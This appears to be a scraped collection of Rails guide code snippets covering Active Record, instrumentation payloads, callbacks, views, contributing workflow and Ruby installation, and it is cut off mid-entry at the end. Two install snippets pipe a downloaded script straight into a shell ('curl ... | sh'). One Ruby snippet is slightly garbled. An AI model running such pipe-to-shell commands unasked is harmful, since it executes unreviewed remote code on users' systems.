'Rails.autoloaders.once' provides a loader for one-time files. These can be used for advanced debugging or customization but require knowledge of Zeitwerk internals.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.main\nRails.autoloaders.once\n\n```\n\n----------------------------------------\n\nTITLE: Rails GET Request with Headers Ruby\nDESCRIPTION: Demonstrates how to make a GET request to a controller action with custom headers.  This example calls the ':show' action and passes the 'HTTP_REFERER' header.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nget article_url(Article.first), headers: { \"HTTP_REFERER\" => \"http://example.com/home\" }\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for render_partial.action_view in Ruby\nDESCRIPTION: This snippet shows the payload format for the `render_partial.action_view` event. It's a Ruby hash containing the `:identifier` (full path to the partial template) and any `:locals` passed as a hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  identifier: \"/Users/adam/projects/notifications/app/views/posts/_form.html.erb\",\n  locals: { foo: \"bar\" }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Cache Cleanup Payload in MemoryStore\nDESCRIPTION: Example of a payload structure for cache_cleanup.active_support event which is emitted when cleaning up the cache in MemoryStore, showing the store and size before cleanup.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  store: \"ActiveSupport::Cache::MemoryStore\",\n  size: 9001\n}\n```\n\n----------------------------------------\n\nTITLE: Including Elements in Array with including in Ruby\nDESCRIPTION: This code shows the use of the `including` method, returning a new array containing the original elements plus the specified elements. Defined in `active_support/core_ext/array/access.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_119\n\nLANGUAGE: ruby\nCODE:\n```\n[ 1, 2, 3 ].including(4, 5)          # => [ 1, 2, 3, 4, 5 ]\n[ [ 0, 1 ] ].including([ [ 1, 0 ] ]) # => [ [ 0, 1 ], [ 1, 0 ] ]\n```\n\n----------------------------------------\n\nTITLE: Overriding Engine Views with ERB\nDESCRIPTION: Example of overriding an engine's view template with custom HTML and ERB code in the main application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_59\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Articles</h1>\n<%= link_to \"New Article\", new_article_path %>\n<% @articles.each do |article| %>\n  <h2><%= article.title %></h2>\n  <small>By <%= article.author %></small>\n  <%= simple_format(article.text) %>\n  <hr>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Checking Node.js Version in Bash\nDESCRIPTION: Command to verify the installation of Node.js by checking its version in the terminal.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ node --version\n```\n\n----------------------------------------\n\nTITLE: RESTful File Downloads in Rails\nDESCRIPTION: Demonstrates implementing RESTful file downloads by adding PDF format support to a show action. Uses respond_to to handle different format requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass ClientsController < ApplicationController\n  # The user can request to receive this resource as HTML or PDF.\n  def show\n    @client = Client.find(params[:id])\n\n    respond_to do |format|\n      format.html\n      format.pdf { render pdf: generate_pdf(@client) }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HTML Output for grouped_options_for_select Example - HTML\nDESCRIPTION: Shows the expected HTML output produced by grouped_options_for_select for a select with a prompt and grouped options. Demonstrates the use of the option and optgroup elements, including selected attributes. Intended as a reference for the output of the grouped select helper in Rails forms.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_16\n\nLANGUAGE: html\nCODE:\n```\n<option value=\\\"\\\">Choose a product...</option>\\n<optgroup label=\\\"Hats\\\">\\n  <option value=\\\"Baseball Cap\\\">Baseball Cap</option>\\n  <option selected=\\\"selected\\\" value=\\\"Cowboy Hat\\\">Cowboy Hat</option>\\n</optgroup>\n```\n\n----------------------------------------\n\nTITLE: User Model with Active Storage Avatar\nDESCRIPTION: This snippet demonstrates a User model with an Active Storage avatar attachment. It shows how to retrieve the GlobalID and Signed GlobalID of a User instance. The `GlobalID::Identification` concern is automatically included in Active Record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/user.rb\nclass User < ApplicationRecord\n  has_one_attached :avatar\nend\n\nuser = User.find(1)\nuser.to_global_id.to_s #=> gid://MyRailsApp/User/1\nuser.to_signed_global_id.to_s #=> BAh7CEkiCG…\n```\n\n----------------------------------------\n\nTITLE: Creating Edge Rails Applications\nDESCRIPTION: Commands for creating Rails applications using the latest code from the Rails Git repository or a local Rails checkout, using the --edge or --dev flags respectively.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp --edge\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ ruby /path/to/rails/railties/bin/rails new myapp --dev\n```\n\n----------------------------------------\n\nTITLE: Running user commands in Podman dev container\nDESCRIPTION: Commands to run user setup commands and access a shell in a Podman development container for Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ tools/devcontainer run-user-commands\n$ tools/devcontainer sh\n```\n\n----------------------------------------\n\nTITLE: Squashing Commits for Rails Pull Request\nDESCRIPTION: This bash snippet demonstrates how to squash multiple commits into a single commit for a Rails pull request, including rebasing interactively and force pushing the changes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_44\n\nLANGUAGE: bash\nCODE:\n```\n$ git fetch rails\n$ git checkout my_new_branch\n$ git rebase -i rails/main\n\n< Choose 'squash' for all of your commits except the first one. >\n< Edit the commit message to make sense, and describe all your changes. >\n\n$ git push fork my_new_branch --force-with-lease\n```\n\n----------------------------------------\n\nTITLE: Updating npm Package Names for Rails 6\nDESCRIPTION: This snippet shows how to update the npm package names for Action Cable, Active Storage, and Rails UJS when upgrading to Rails 6. The packages have been moved to the @rails scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_30\n\nLANGUAGE: javascript\nCODE:\n```\nactioncable   → @rails/actioncable\nactivestorage → @rails/activestorage\nrails-ujs     → @rails/ujs\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for render_template.action_view in Ruby\nDESCRIPTION: This snippet displays an example payload for the `render_template.action_view` event. The Ruby hash includes the `:identifier` (full path to the template), the applicable `:layout`, and any `:locals` passed as a hash to the template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  identifier: \"/Users/adam/projects/notifications/app/views/posts/index.html.erb\",\n  layout: \"layouts/application\",\n  locals: { foo: \"bar\" }\n}\n```\n\n----------------------------------------\n\nTITLE: Nested Stylesheet Includes (Rails/ERB)\nDESCRIPTION: This example shows how to include CSS files within a nested directory (photos/columns.css) using the `stylesheet_link_tag` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_49\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"main\", \"photos/columns\" %>\n```\n\n----------------------------------------\n\nTITLE: Models in Different Modules without Explicit Class Names\nDESCRIPTION: Example showing how associations between models in different modules will not work by default without specifying the full class name. The models are in separate namespaces.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_102\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MyApplication\n  module Business\n    class Supplier < ApplicationRecord\n      has_one :account\n    end\n  end\n\n  module Billing\n    class Account < ApplicationRecord\n      belongs_to :supplier\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Encrypting and Decrypting Model Attributes via API - Ruby\nDESCRIPTION: Demonstrates calling the Active Record Encryption API to encrypt or decrypt all encryptable attributes for a model instance. Requires an encrypted model (e.g., Article) and proper encryption configuration. No arguments required; these methods act on model instance attributes and return the object with mutated (encrypted/decrypted) attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\narticle.encrypt # encrypt or re-encrypt all the encryptable attributes\narticle.decrypt # decrypt all the encryptable attributes\n```\n\n----------------------------------------\n\nTITLE: Using default_scope with explicit scope overrides in Ruby on Rails\nDESCRIPTION: Demonstrates how to use unscope, rewhere, and other methods to override default_scope in ActiveRecord models. Shows the SQL generated for different scope combinations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_84\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  default_scope { where state: \"pending\" }\n  scope :active, -> { unscope(where: :state).where(state: \"active\") }\n  scope :inactive, -> { rewhere state: \"inactive\" }\nend\n\nUser.all\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'pending'\n\nUser.active\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'active'\n\nUser.inactive\n# SELECT \"users\".* FROM \"users\" WHERE \"users\".\"state\" = 'inactive'\n```\n\n----------------------------------------\n\nTITLE: Example Payload for redirect_to.action_controller Hook in Ruby\nDESCRIPTION: Displays an example Ruby Hash payload structure for the `redirect_to.action_controller` notification. This event is triggered when a redirect occurs within a controller action. The payload includes the HTTP response status code (e.g., 302), the target location URL for the redirection, and the original `ActionDispatch::Request` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  status: 302,\n  location: \"http://localhost:3000/posts/new\",\n  request: <ActionDispatch::Request:0x00007ff1cb9bd7b8>\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Multiple Models with Composite Primary Key - Find Method\nDESCRIPTION: This snippet demonstrates how to use the `find` method to retrieve multiple records using composite primary keys. An array of arrays, where each inner array represents a composite key, is passed to the `find` method.  The example finds products with primary keys `[1, \"ABC98765\"]` and `[7, \"ZZZ11111\"]`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the products with primary keys [1, \"ABC98765\"] and [7, \"ZZZ11111\"]\nirb> products = Product.find([[1, \"ABC98765\"], [7, \"ZZZ11111\"]])\n=> [\n  #<Product store_id: 1, sku: \"ABC98765\", description: \"Red Hat\">,\n  #<Product store_id: 7, sku: \"ZZZ11111\", description: \"Green Pants\">\n]\n```\n\n----------------------------------------\n\nTITLE: Encoding JSON with ActiveSupport and JSON Gem - Ruby\nDESCRIPTION: This snippet emphasizes the transition of ActiveSupport's JSON encoder from a custom Ruby implementation to relying on the standardized JSON gem. This change improves performance, reliability, and compatibility with third-party JSON handling. Dependencies include the 'json' gem and ActiveSupport. The encoder now expects JSON inputs and outputs to align with the JSON gem's behaviors. Limitations may include subtle differences where the custom implementation diverged from the gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: Ruby\nCODE:\n```\n// Previously used custom Ruby implementation\n# Now using JSON gem like so:\nrequire 'json'\nobject.to_json\n```\n\n----------------------------------------\n\nTITLE: EXPLAIN Output Example for MySQL/MariaDB\nDESCRIPTION: This is an example of the output generated by the `explain` command in MySQL or MariaDB. It shows the different columns and their values, providing information about how the query is executed by the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_210\n\nLANGUAGE: sql\nCODE:\n```\nEXPLAIN SELECT `customers`.* FROM `customers` INNER JOIN `orders` ON `orders`.`customer_id` = `customers`.`id` WHERE `customers`.`id` = 1\n+----+-------------+------------+-------+---------------+\n| id | select_type | table      | type  | possible_keys |\n+----+-------------+------------+-------+---------------+\n|  1 | SIMPLE      | customers  | const | PRIMARY       |\n|  1 | SIMPLE      | orders     | ALL   | NULL          |\n+----+-------------+------------+-------+---------------+\n+---------+---------+-------+------+-------------+\n| key     | key_len | ref   | rows | Extra       |\n+---------+---------+-------+------+-------------+\n| PRIMARY | 4       | const |    1 |             |\n| NULL    | NULL    | NULL  |    1 | Using where |\n+---------+---------+-------+------+-------------+\n\n2 rows in set (0.00 sec)\n```\n\n----------------------------------------\n\nTITLE: Configuring Default HTTP Headers in Rails\nDESCRIPTION: This configuration option allows setting default HTTP headers for all responses in a Rails application. The default headers include security-related settings like X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, X-Download-Options, X-Permitted-Cross-Domain-Policies, and Referrer-Policy. The default values for these headers have changed across different Rails versions, primarily regarding the X-XSS-Protection header.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_47\n\nLANGUAGE: text\nCODE:\n```\n{\n  \"X-Frame-Options\" => \"SAMEORIGIN\",\n  \"X-XSS-Protection\" => \"1; mode=block\",\n  \"X-Content-Type-Options\" => \"nosniff\",\n  \"X-Download-Options\" => \"noopen\",\n  \"X-Permitted-Cross-Domain-Policies\" => \"none\",\n  \"Referrer-Policy\" => \"strict-origin-when-cross-origin\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n{\n  \"X-Frame-Options\" => \"SAMEORIGIN\",\n  \"X-XSS-Protection\" => \"0\",\n  \"X-Content-Type-Options\" => \"nosniff\",\n  \"X-Download-Options\" => \"noopen\",\n  \"X-Permitted-Cross-Domain-Policies\" => \"none\",\n  \"Referrer-Policy\" => \"strict-origin-when-cross-origin\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n{\n  \"X-Frame-Options\" => \"SAMEORIGIN\",\n  \"X-XSS-Protection\" => \"0\",\n  \"X-Content-Type-Options\" => \"nosniff\",\n  \"X-Download-Options\" => \"noopen\",\n  \"X-Permitted-Cross-Domain-Policies\" => \"none\",\n  \"Referrer-Policy\" => \"strict-origin-when-cross-origin\"\n}\n```\n\n----------------------------------------\n\nTITLE: Generated XML Example (HTML)\nDESCRIPTION: This HTML shows the output that would be produced by the Builder example code. It demonstrates the structure of the generated XML elements and their attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n<em>emphasized</em>\n<em><b>emph &amp; bold</b></em>\n<a href=\"https://rubyonrails.org\">A link</a>\n<target option=\"fast\" name=\"compile\" />\n```\n\n----------------------------------------\n\nTITLE: Reverting Migrations for a Specific Engine Scope (Bash)\nDESCRIPTION: Reverts all migrations associated with a specific engine ('blorgh') back to version 0 (the initial state) by using the `SCOPE` and `VERSION=0` environment variables with the `db:migrate` task.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_36\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate SCOPE=blorgh VERSION=0\n```\n\n----------------------------------------\n\nTITLE: Implementing Active Record Enums\nDESCRIPTION: Example of using Active Record enums for mapping integer values to named attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nclass Conversation < ActiveRecord::Base\n  enum status: [ :active, :archived ]\nend\n\nconversation.archived!\nconversation.active? # => false\nconversation.status  # => \"archived\"\n\nConversation.archived # => Relation for all archived Conversations\n\nConversation.statuses # => { \"active\" => 0, \"archived\" => 1 }\n```\n\n----------------------------------------\n\nTITLE: HTML output of select box with value-label pairs\nDESCRIPTION: This HTML code shows the generated select box with value-label pairs for each city.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_34\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"city\" id=\"city\">\n  <option value=\"BE\">Berlin</option>\n  <option value=\"CHI\">Chicago</option>\n  <option value=\"MD\">Madrid</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: After All Transactions Commit Hook in Ruby on Rails\nDESCRIPTION: Demonstrates the use of after_all_transactions_commit for executing code after all transaction states have been persisted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\ndef publish_article(article)\n  article.update(published: true)\n\n  ActiveRecord.after_all_transactions_commit do\n    PublishNotificationMailer.with(article: article).deliver_later\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Environment in Rails 3.2\nDESCRIPTION: Configuration setting for mass assignment protection in Rails 3.2 test environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# Raise exception on mass assignment protection for Active Record models\nconfig.active_record.mass_assignment_sanitizer = :strict\n```\n\n----------------------------------------\n\nTITLE: Defining Association with Foreign Key Option\nDESCRIPTION: This snippet illustrates how to use the `foreign_key:` option in an association to specify a composite foreign key. This is needed when the default assumption of using only the `:id` column is not sufficient.  The `Author` and `Book` models are defined, with `Book` belonging to `Author` using the `foreign_key: [:author_first_name, :author_last_name]` option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  self.primary_key = [:first_name, :last_name]\n  has_many :books, foreign_key: [:first_name, :last_name]\nend\n\nclass Book < ApplicationRecord\n  belongs_to :author, foreign_key: [:author_first_name, :author_last_name]\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query After Reselecting (SQL)\nDESCRIPTION: This SQL query is the result of the previous Ruby code snippet using the `reselect` method. It selects only the `created_at` column from the `books` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_110\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.created_at FROM books\n```\n\n----------------------------------------\n\nTITLE: Modifying a Test to Assert an Error in Rails (Ruby)\nDESCRIPTION: This Ruby code snippet modifies a test case to assert that a specific error (NameError) is raised when a particular block of code is executed. The `assert_raises` method is used to check for the presence of the expected error, allowing the test to pass when the error occurs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"should report error\" do\n  # some_undefined_variable is not defined elsewhere in the test case\n  assert_raises(NameError) do\n    some_undefined_variable\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Unscoping Where Condition (SQL)\nDESCRIPTION: This SQL query represents the result of the previous Ruby code snippet after the `unscope(where: :id)` method has been applied. It selects all columns from the `books` table where `out_of_print` is false (0), effectively removing the condition related to `id`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_103\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books WHERE out_of_print = 0\n```\n\n----------------------------------------\n\nTITLE: Writing a Good Commit Message for Rails Contributions\nDESCRIPTION: This markdown snippet provides an example of a well-formatted commit message for Rails contributions. It includes a short summary, detailed description, code examples, and bullet points.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_40\n\nLANGUAGE: markdown\nCODE:\n```\nShort summary (ideally 50 characters or less)\n\nMore detailed description, if necessary. Each line should wrap at\n72 characters. Try to be as descriptive as you can. Even if you\nthink that the commit content is obvious, it may not be obvious\nto others. Add any description that is already present in the\nrelevant issues; it should not be necessary to visit a webpage\nto check the history.\n\nThe description section can have multiple paragraphs.\n\nCode examples can be embedded by indenting them with 4 spaces:\n\n    class ArticlesController\n      def index\n        render json: Article.limit(10)\n      end\n    end\n\nYou can also add bullet points:\n\n- make a bullet point by starting a line with either a dash (-)\n  or an asterisk (*)\n\n- wrap lines at 72 characters, and indent any additional lines\n  with 2 spaces for readability\n```\n\n----------------------------------------\n\nTITLE: Creating a test application using your local Rails branch\nDESCRIPTION: Commands to create a new Rails application that uses your local development branch for testing changes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ cd rails\n$ bundle exec rails new ~/my-test-app --dev\n```\n\n----------------------------------------\n\nTITLE: Example of Regular Comment vs. Result Comment Formatting\nDESCRIPTION: Shows the difference between regular comments (without arrows) and result comments (with arrows) in code examples. Demonstrates proper formatting for both types.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n#   polymorphic_url(record)  # same as comment_url(record)\n```\n\n----------------------------------------\n\nTITLE: Using new Builder-style syntax for HTML tags in Rails views\nDESCRIPTION: Rails 5.1 introduces a new Builder-style syntax for generating HTML tags in views, using methods like tag.div and tag.br.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\n<%= tag.div do %>\n  Hello world\n<% end %>\n\n<%= tag.br %>\n```\n\n----------------------------------------\n\nTITLE: Deleting an Author and Their Books Without Associations in Ruby on Rails\nDESCRIPTION: This code shows the process of deleting an author and all their books without using associations, requiring manual retrieval and deletion of each book.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_3\n\nLANGUAGE: Ruby\nCODE:\n```\n@books = Book.where(author_id: @author.id)\n@books.each do |book|\n  book.destroy\nend\n@author.destroy\n```\n\n----------------------------------------\n\nTITLE: Using ActiveModel::Dirty (Ruby)\nDESCRIPTION: This Ruby snippet demonstrates how to use `ActiveModel::Dirty` to track changes to model attributes. It includes defining attribute methods, calling `[attr_name]_will_change!` before changes, and using methods to persist, reload, and rollback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::Dirty\n\n  attr_reader :first_name, :last_name\n  define_attribute_methods :first_name, :last_name\n\n  def initialize\n    @first_name = nil\n    @last_name = nil\n  end\n\n  def first_name=(value)\n    first_name_will_change! unless value == @first_name\n    @first_name = value\n  end\n\n  def last_name=(value)\n    last_name_will_change! unless value == @last_name\n    @last_name = value\n  end\n\n  def save\n    # Persist data - clears dirty data and moves `changes` to `previous_changes`.\n    changes_applied\n  end\n\n  def reload!\n    # Clears all dirty data: current changes and previous changes.\n    clear_changes_information\n  end\n\n  def rollback!\n    # Restores all previous data of the provided attributes.\n    restore_attributes\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a User object to trigger save callbacks in Rails\nDESCRIPTION: This IRB snippet creates a new `User` object. This triggers the `before_save`, `around_save`, and `after_save` callbacks. The output shows the log messages from these callbacks, including the password hashing, saving process, and cache update.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_10\n\nLANGUAGE: irb\nCODE:\n```\nirb> user = User.create(name: \"Jane Doe\", password: \"password\", email: \"jane.doe@example.com\")\n\nPassword hashed for user with email: jane.doe@example.com\nSaving user with email: jane.doe@example.com\nUser saved with email: jane.doe@example.com\nUpdate Cache\n=> #<User id: 1, email: \"jane.doe@example.com\", created_at: \"2024-03-20 16:02:43.685500000 +0000\", updated_at: \"2024-03-20 16:02:43.685500000 +0000\", name: \"Jane Doe\">\n```\n\n----------------------------------------\n\nTITLE: Defining an after_commit Callback Object (Class Method)\nDESCRIPTION: This example demonstrates defining a callback object, `FileDestroyerCallback`, using a class method `after_commit`.  This method is called after a commit and deletes a file.  The model `PictureFile` then uses this callback by referencing the `FileDestroyerCallback` class directly, without instantiation. The callback method receives the model object as a parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nclass FileDestroyerCallback\n  def self.after_commit(file)\n    if File.exist?(file.filepath)\n      File.delete(file.filepath)\n    end\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass PictureFile < ApplicationRecord\n  after_commit FileDestroyerCallback\nend\n```\n\n----------------------------------------\n\nTITLE: Database Configuration for Solid Cache\nDESCRIPTION: This snippet shows the database configuration required for Solid Cache.  It defines a 'cache' database under the development environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_33\n\nLANGUAGE: bash\nCODE:\n```\ndevelopment:\n  <<: * default\n  database: cache\n```\n\n----------------------------------------\n\nTITLE: Installing Ruby Prerequisites and Mise on Windows via WSL/Ubuntu (bash)\nDESCRIPTION: Executed within the Ubuntu environment installed via WSL. Updates package lists and installs necessary dependencies using apt, installs the Mise version manager, configures the bash environment for Mise, and installs Ruby version 3 globally using Mise. Assumes WSL with Ubuntu is already set up.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n# Install dependencies with apt\n$ sudo apt update\n$ sudo apt install build-essential rustc libssl-dev libyaml-dev zlib1g-dev libgmp-dev\n\n# Install Mise version manager\n$ curl https://mise.run | sh\n$ echo 'eval \"$(~/.local/bin/mise activate bash)\"' >> ~/.bashrc\n$ source ~/.bashrc\n\n# Install Ruby globally with Mise\n$ mise use -g ruby@3\n```\n\n----------------------------------------\n\nTITLE: Installing Ruby Prerequisites and Mise on Ubuntu (bash)\nDESCRIPTION: Updates package lists and installs necessary dependencies (build-essential, rustc, libssl-dev, libyaml-dev, zlib1g-dev, libgmp-dev) using apt, installs the Mise version manager, configures the bash environment for Mise, and installs Ruby version 3 globally using Mise. Requires Ubuntu Jammy 22.04 or newer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# Install dependencies with apt\n$ sudo apt update\n$ sudo apt install build-essential rustc libssl-dev libyaml-dev zlib1g-dev libgmp-dev\n\n# Install Mise version manager\n$ curl https://mise.run | sh\n$ echo 'eval \"$(~/.local/bin/mise activate)\"' >> ~/.bashrc\n$ source ~/.bashrc\n\n# Install Ruby globally with Mise\n$ mise use -g ruby@3\n```\n\n----------------------------------------\n\nTITLE: Creating a Concern Module for Notifications in Rails\nDESCRIPTION: This code snippet creates a concern module named `Product::Notifications` that includes logic for managing subscribers and sending notifications when a product is back in stock. It uses `ActiveSupport::Concern` to extend the module and includes a block that runs when the module is included in a class, defining associations and callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_112\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Product::Notifications\n  extend ActiveSupport::Concern\n\n  included do\n    has_many :subscribers, dependent: :destroy\n    after_update_commit :notify_subscribers, if: :back_in_stock?\n  end\n\n  def back_in_stock?\n    inventory_count_previously_was == 0 && inventory_count > 0\n  end\n\n  def notify_subscribers\n    subscribers.each do |subscriber|\n      ProductMailer.with(product: self, subscriber: subscriber).in_stock.deliver_later\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Boolean Flag Documentation\nDESCRIPTION: Shows how to properly document boolean configuration options by focusing on their semantic meaning rather than specific values. Demonstrates good practice for documenting predicate methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n# +config.action_mailer.perform_deliveries+ specifies whether mail\n# will actually be delivered and is true by default\n```\n\n----------------------------------------\n\nTITLE: Using save callbacks in Rails\nDESCRIPTION: This code snippet demonstrates the use of `before_save`, `around_save`, and `after_save` callbacks. The `hash_password` callback hashes the user's password before saving, `log_saving` logs the saving process around the save operation, and `update_cache` updates the cache after saving.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  before_save :hash_password\n  around_save :log_saving\n  after_save :update_cache\n\n  private\n    def hash_password\n      self.password_digest = BCrypt::Password.create(password)\n      Rails.logger.info(\"Password hashed for user with email: #{email}\")\n    end\n\n    def log_saving\n      Rails.logger.info(\"Saving user with email: #{email}\")\n      yield\n      Rails.logger.info(\"User saved with email: #{email}\")\n    end\n\n    def update_cache\n      Rails.cache.write([\"user_data\", self], attributes)\n      Rails.logger.info(\"Update Cache\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Validations in a Model\nDESCRIPTION: This snippet demonstrates how to include `ActiveModel::Validations` in a model and define validations for attributes like `name`, `email`, and `token`. The `validates` method is used with options like `presence: true` and `format: { with: URI::MailTo::EMAIL_REGEXP }` to enforce specific constraints on the attributes. The `validates!` method is used to raise an exception if validation fails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::Validations\n\n  attr_accessor :name, :email, :token\n\n  validates :name, presence: true\n  validates :email, format: { with: URI::MailTo::EMAIL_REGEXP }\n  validates! :token, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Documenting Option Sections with Examples for encrypt_and_sign - Ruby\nDESCRIPTION: Shows a section of documentation for the 